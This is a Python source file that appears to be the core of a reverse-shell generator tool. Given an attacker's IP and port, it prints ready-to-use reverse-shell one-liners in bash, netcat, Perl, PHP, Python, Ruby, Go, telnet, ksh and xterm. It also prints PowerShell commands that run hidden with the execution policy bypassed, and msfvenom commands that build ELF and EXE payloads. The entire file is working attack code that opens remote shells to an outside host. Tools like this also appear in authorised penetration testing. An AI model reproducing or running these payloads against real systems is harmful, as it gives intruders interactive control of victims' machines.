# This is the main core of the program. This is where all the shell codes lay

from src.design import print_error, print_info, print_shell, bcolors


def return_shells(shell, ip, port):
	if shell == "all":
		from src.allshells import all_shells
		all_shells(ip, port)
	else:
		if shell == "bash":
			print_shell("Bash")
			bash = "bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1"
			bash2 = "0<&196;exec 196<>/dev/tcp/"+ip+"/"+port+"; sh <&196 >&196 2>&196"
			print(bash);print(bash2)
		elif shell == "go":
			print_shell("Go")
			go = """echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial(\"tcp",\""""+ip+""":"""+port+"""\");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go"""
			print(go)
		elif shell == "nc" or shell == "netcat":
			print_shell("NetCat")
			nc =bcolors.YELLOW + """[1]"""+bcolors.ENDC+""" nc -e /bin/sh """+ip+""" """+port
			nc2 = bcolors.YELLOW + """[2]"""+bcolors.ENDC+""" rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc """+ip+""" """+port+""" >/tmp/f"""
			ncatssl = bcolors.YELLOW + """[3]"""+bcolors.ENDC+""" ncat --ssl -vv -l -p """+port+"""; mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect \""""+ip+""":"""+port+"""\" > /tmp/s; rm /tmp/s"""
			nc3 = bcolors.YELLOW + """[4]"""+bcolors.ENDC+""" touch /tmp/f; rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc """+ip+""" """+port+""" > /tmp/f"""
			print(nc);print(nc2);print(ncatssl);print(nc3)
		elif shell == "msfvenom":
			print_shell("MSFVenom")
			lin_sl = bcolors.YELLOW + """[1]"""+bcolors.ENDC+""" msfvenom -p linux/x86/shell_reverse_tcp LHOST="""+ip+""" LPORT="""+port+""" -f elf >reverse.elf"""
			win_sl = bcolors.YELLOW + """[2]"""+bcolors.ENDC+""" msfvenom -p windows/shell_reverse_tcp LHOST="""+ip+""" LPORT="""+port+""" -f exe > reverse.exe"""
			print(lin_sl);print(win_sl)
		elif shell == "perl":
			print_shell("Perl")
			perl= """perl -e 'use Socket;$i=\"""" + ip + """";$p="""+port+""";socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'"""
			print(perl)
		elif shell == "php":
			print_shell("PHP")
			php = bcolors.YELLOW + """[1]"""+bcolors.ENDC+""" php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");exec("/bin/sh <i <&3 >&3 2>&3");'"""
			php2 = bcolors.YELLOW + """[2]"""+bcolors.ENDC+""" php -r '$sock=fsockopen(\""""+ip+"""","""+port+""");$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"""
			print(php);print(php2)
		elif shell == "powershell" or shell == "ps":
			print_shell("Powershell")
			powershell1 = bcolors.YELLOW + """[1]"""+bcolors.ENDC+""" powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\""""+ip+"""","""+port+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
			powershell2 = bcolors.YELLOW + """[2]"""+bcolors.ENDC+""" powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'"""+ip+"""\',"""+port+""");$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"""
			print(powershell1);print(powershell2)
		elif shell == "python":
			print_shell("Python")
			python = bcolors.YELLOW + """[1]"""+bcolors.ENDC+""" python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+ip+"""","""+port+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno,2);p=subprocess.call(["/bin/sh","-i"]);'"""
			python2 = bcolors.YELLOW + """[2]"""+bcolors.ENDC+""" python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\""""+ip+"""","""+port+"""));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'"""
			print(python);print(python2)
		elif shell == "ruby":
			print_shell("Ruby")
			ruby = """ruby -rsocket -e'f=TCPSocket.open(\""""+ip+"""","""+port+""").to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d", f,f,f)'"""
			print(ruby)
		elif shell == "xterm":
			print_shell("xterm")
			xterm = """xterm -display """+ip+""":"""+port
			print(xterm)
		elif shell == "telnet":
			print_shell("telnet")
			telnet = """TF=$(mktemp -u); mkfifo $TF && telnet """+ip+""" """+port+""" 0<$TF | /bin/sh 1>$TF"""
			print(telnet)
		elif shell == "ksh":
			print_shell("ksh")
			ksh = """ksh -c 'ksh -i > /dev/tcp/"""+ip+"""/"""+port+""" 2>&1 0>&1"""
			print(ksh)
		else:
			print_error("No shell type was given or shell entered is not in the list")
			
